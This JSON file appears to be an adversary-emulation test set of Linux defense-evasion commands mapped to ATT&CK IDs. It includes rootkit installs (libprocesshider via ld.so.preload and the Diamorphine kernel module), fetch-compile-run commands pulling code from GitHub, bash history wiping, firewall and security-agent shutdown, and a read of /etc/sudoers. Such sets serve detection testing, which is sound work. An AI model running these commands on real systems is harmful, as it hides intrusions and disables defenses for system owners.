{
  "commands": [
    {
      "tactic_id": "T1014-1",
      "technique": "Rootkit: libprocesshider dynamic linker injection",
      "command": "mkdir -p ./Output/DefenceEvasion_RHEL && { REPO_URL=\"https://github.com/gianlucaborello/libprocesshider\"; REVISION=\"25e0587d6bf2137f8792dc83242b6b0e5a72b415\"; LIBRARY_PATH=\"/usr/local/lib/libprocesshider.so\"; EVIL_SCRIPT_PATH=\"/usr/local/bin/evil_script.py\"; OUTPUT_FILE=\"./Output/DefenceEvasion_RHEL/T1014_3_Defence_evasion.txt\"; mkdir -p /tmp/atomic && cd /tmp/atomic && curl -sLO ${REPO_URL}/archive/${REVISION}.zip && unzip ${REVISION}.zip && cd libprocesshider-${REVISION} && make && sudo cp libprocesshider.so ${LIBRARY_PATH}; if [ -f /usr/bin/ping ]; then PING_PATH=\"/usr/bin/ping\"; elif [ -f /bin/ping ]; then PING_PATH=\"/bin/ping\"; else echo 'ping not found'; exit 1; fi; sudo cp ${PING_PATH} ${EVIL_SCRIPT_PATH}; echo ${LIBRARY_PATH} | sudo tee -a /etc/ld.so.preload; ${EVIL_SCRIPT_PATH} localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo 'process hidden'; sudo sed -i \"\\:^${LIBRARY_PATH}:d\" /etc/ld.so.preload; sudo rm -rf ${LIBRARY_PATH} ${EVIL_SCRIPT_PATH} /tmp/atomic; sudo depmod -a; echo 'Execution of Defence Evasion T1014 complete.'; } &> ./Output/DefenceEvasion_RHEL/T1014_3_Defence_evasion.txt"
    },
    {
      "tactic_id": "T1014-2",
      "technique": "Rootkit: Loadable Kernel Module - Diamorphine",
      "command": "mkdir -p ./Linux_output/Defence_Evasion && { REPO=\"https://github.com/m0nad/Diamorphine/\"; REV=\"898810523aa2033f582a4a5903ffe453334044f9\"; ROOTKIT_NAME=\"diamorphine\"; ROOTKIT_PATH=\"/lib/modules/$(uname -r)/${ROOTKIT_NAME}.ko\"; TMP_DIR=\"/tmp/atomic\"; OUTPUT_FILE=\"./Linux_output/Defence_Evasion/T1014_4_Defence_evasion.txt\"; mkdir -p \"${TMP_DIR}\" && cd \"${TMP_DIR}\" && curl -sLO \"${REPO}/archive/${REV}.zip\" && unzip \"${REV}.zip\" && cd Diamorphine-\"${REV}\" && make && sudo cp \"${ROOTKIT_NAME}.ko\" \"${ROOTKIT_PATH}\" && sudo depmod -a && sudo modprobe \"${ROOTKIT_NAME}\" && ping -c 10 localhost >/dev/null & TARGETPID=\"$!\" && ps \"$TARGETPID\" && kill -31 \"$TARGETPID\" && ps \"$TARGETPID\" || echo \"Process $TARGETPID hidden successfully.\" && kill -63 1 && sudo modprobe -r \"${ROOTKIT_NAME}\" && sudo rm -rf \"${ROOTKIT_PATH}\" \"${TMP_DIR}\" && sudo depmod -a; echo \"Diamorphine LKM Rootkit Simulation Completed.\"; } &> ./Linux_output/Defence_Evasion/T1014_4_Defence_evasion.txt"
    },
    {
      "tactic_id": "T1548.003",
      "technique": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
      "command": "grep -v -e ^$ /etc/sudoers"
    },
    {
      "tactic_id": "T1036.005",
      "technique": "Masquerading: Match Legitimate Name or Location",
      "command": "mkdir -p $HOME/... && cp $(which sh) $HOME/... && $HOME/.../sh -c \"echo 'Your life is 100% your responsibility'\""
    },
    {
      "tactic_id": "T1070.003-1",
      "technique": "Indicator Removal on Host: Clear Bash history (rm)",
      "command": "rm -f $HOME/.bash_history"
    },
    {
      "tactic_id": "T1070.003-2",
      "technique": "Indicator of Reading history ( cat /.bash_history )",
      "command": " history > history.txt ; cat /.bash_history"
    },
    {
      "tactic_id": "T1070.003-3",
      "technique": "Indicator Removal on Host: Clear Bash history (echo)",
      "command": "echo \"\" > $HOME/.bash_history"
    },
    {
      "tactic_id": "T1070.003-4",
      "technique": "Indicator Removal on Host: Clear Bash history (cat /dev/null)",
      "command": "cat /dev/null > $HOME/.bash_history"
    },
    {
      "tactic_id": "T1070.003-5",
      "technique": "Indicator Removal on Host: Clear Bash history (ln -sf /dev/null)",
      "command": "ln -sf /dev/null $HOME/.bash_history"
    },
    {
     "tactic_id": "T1070.003-6",
     "technique": "Indicator Removal on Host: Clear Bash history (truncate)",
     "command": "[ -f \"$HOME/.bash_history\" ] && truncate -s 0 \"$HOME/.bash_history\" || echo \"No history file found at $HOME/.bash_history\""
    },
    {
      "tactic_id": "T1070.003-7",
      "technique": "Indicator Removal on Host: Clear history of a bunch of shells",
      "command": "unset HISTFILE && export HISTFILESIZE=0 && history -c"
    },
    {
      "tactic_id": "T1027.004-1",
      "technique": "Obfuscated Files or Information: Compile After Delivery - C compile",
      "command": "wget -O /tmp/T1027-004-test.c https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1027.004/src/T1027-004-test.c && gcc /tmp/T1027-004-test.c -o /tmp/test_c && /tmp/test_c"
    },
    {
      "tactic_id": "T1027.004-2",
      "technique": "Obfuscated Files or Information: Compile After Delivery - CC compile",
      "command": "wget -O /tmp/T1027-004-test.cc https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1027.004/src/T1027-004-test.cc && g++ /tmp/T1027-004-test.cc -o /tmp/test_cc && /tmp/test_cc"
    },
    {
      "tactic_id": "T1027.004-3",
      "technique": "Obfuscated Files or Information: Compile After Delivery - Go compile",
      "command": "wget -O /tmp/T1027-004-test.go https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1027.004/src/T1027-004-test.go && go run /tmp/T1027-004-test.go"
    },
    {
      "tactic_id": "T1070.004-1",
      "technique": "Indicator Removal: File Deletion - Delete a single file",
      "command": "mkdir -p /tmp/victim-files && touch /tmp/victim-files/T1070.004-test.txt && rm -f /tmp/victim-files/T1070.004-test.txt"
    },
    {
      "tactic_id": "T1070.004-2",
      "technique": "Indicator Removal: File Deletion - Delete an entire folder",
      "command": "mkdir -p /tmp/victim-folder && rm -rf /tmp/victim-folder"
    },
    {
      "tactic_id": "T1070.004-3",
      "technique": "Indicator Removal: File Deletion - Overwrite and delete a file with shred",
      "command": "touch /tmp/victim-shred.txt && shred -u /tmp/victim-shred.txt"
    },
    {
      "tactic_id": "T1553.004",
      "technique": "Subvert Trust Controls: Install Root Certificate",
      "command": "bash Dependencies/RootCertificate.sh"
    },
    {
      "tactic_id": "T1036.006",
      "technique": "Masquerading: Space After Filename",
      "command": "mkdir -p '/tmp/testdirwithspaceend ' && echo -e '#!/bin/bash\necho \"running T1036.006 with space after filename to masquerade init\"\nsleep 5' > '/tmp/testdirwithspaceend /init ' && chmod +x '/tmp/testdirwithspaceend /init ' && '/tmp/testdirwithspaceend /init '"
    },
    {
      "tactic_id": "T1036.004",
      "technique": "Masquerading: Masquerade Task or Service",
      "command": "bash Dependencies/MasqTaskorService.sh"
    },
    {
      "tactic_id": "T1562.004",
      "technique": "Impair Defenses: Disable or Modify System Firewall",
      "command": "systemctl stop firewalld && firewall-cmd --permanent --add-rich-rule='rule family=\"ipv4\" source address=\"1.2.3.4\" reject' && echo \"netfilter.* /dev/null\" >> /etc/rsyslog.conf && systemctl restart rsyslog && echo \"# DISABLED\" >> /etc/firewalld/firewalld.conf && systemctl start firewalld && firewall-cmd --permanent --remove-rich-rule='rule family=\"ipv4\" source address=\"1.2.3.4\" reject' && firewall-cmd --reload && sed -i '/netfilter.* \/dev\/null/d' /etc/rsyslog.conf && systemctl restart rsyslog && sed -i '/# DISABLED/d' /etc/firewalld/firewalld.conf"
    },
    {
      "tactic_id": "T1564.001-1",
      "technique": "Defense Evasion - Hidden Files and Directories",
      "command": "mkdir -p /tmp/immutable_test && echo 'This is an immutable test file.' > /tmp/immutable_test/sample.txt && sudo chattr +i /tmp/immutable_test/sample.txt && sudo chattr +i /tmp/immutable_test && lsattr /tmp/immutable_test/sample.txt && lsattr /tmp/immutable_test && echo 'Fail test' | tee -a /tmp/immutable_test/sample.txt || echo '[!] Modification blocked as expected.' && rm /tmp/immutable_test/sample.txt 2>/dev/null || echo '[!] Deletion blocked as expected.' && sudo chattr -i /tmp/immutable_test/sample.txt && sudo chattr -i /tmp/immutable_test && lsattr /tmp/immutable_test/sample.txt && lsattr /tmp/immutable_test && echo 'Success test' >> /tmp/immutable_test/sample.txt && rm /tmp/immutable_test/sample.txt && rmdir /tmp/immutable_test"
    },
    {
      "tactic_id": "T1562.001",
      "technique": "Defense Evasion - Disable or Modify System Security Software: Stop/Restart Security Agent",
      "command": "sudo systemctl stop ds_agent && sudo systemctl restart ds_agent"
    },
    {
      "tactic_id": "T1564.004",
      "technique": "Defense Evasion - Hide Artifacts: NTFS File Attributes (Unix equivalent symbolic links)",
      "command": "mkdir -p /root/symlink_passwd_demo && ln -sf /etc/passwd /root/symlink_passwd_demo/passwd_link2 && ln -sf /etc/passwd /root/symlink_passwd_demo/passwd_link1 && rm -f /root/symlink_passwd_demo/passwd_link1 && rm -f /root/symlink_passwd_demo/passwd_link2"
    },
    {
      "tactic_id": "T1140",
      "technique": "Defense Evasion - Deobfuscate/Decode Files or Information (hex to text with xxd)",
      "command": "ORIGINAL_TEXT=\"suspicious_command_execution\" && HEX_FILE=\"/tmp/encoded_hex.txt\" && DECODED_FILE=\"/tmp/decoded_output.txt\" && echo -n \"$ORIGINAL_TEXT\" | xxd -p > \"$HEX_FILE\" && cat \"$HEX_FILE\" && xxd -r -p \"$HEX_FILE\" > \"$DECODED_FILE\" && cat \"$DECODED_FILE\" && rm -f \"$HEX_FILE\" \"$DECODED_FILE\""
    },
    {
      "tactic_id": "T1564.001-2",
      "technique": "Defense Evasion - Hide Artifacts: Hidden Files and Directories",
      "command": "HIDDEN_DIR=\"$HOME/.hidden_dir\" && HIDDEN_FILE=\"$HIDDEN_DIR/.hidden_file.txt\" && mkdir -p \"$HIDDEN_DIR\" && echo \"This is a hidden file inside a hidden directory.\" > \"$HIDDEN_FILE\" && ls -la \"$HIDDEN_DIR\" && sleep 3 && rm -f \"$HIDDEN_FILE\" && rmdir \"$HIDDEN_DIR\" 2>/dev/null"
    }
  ]
}
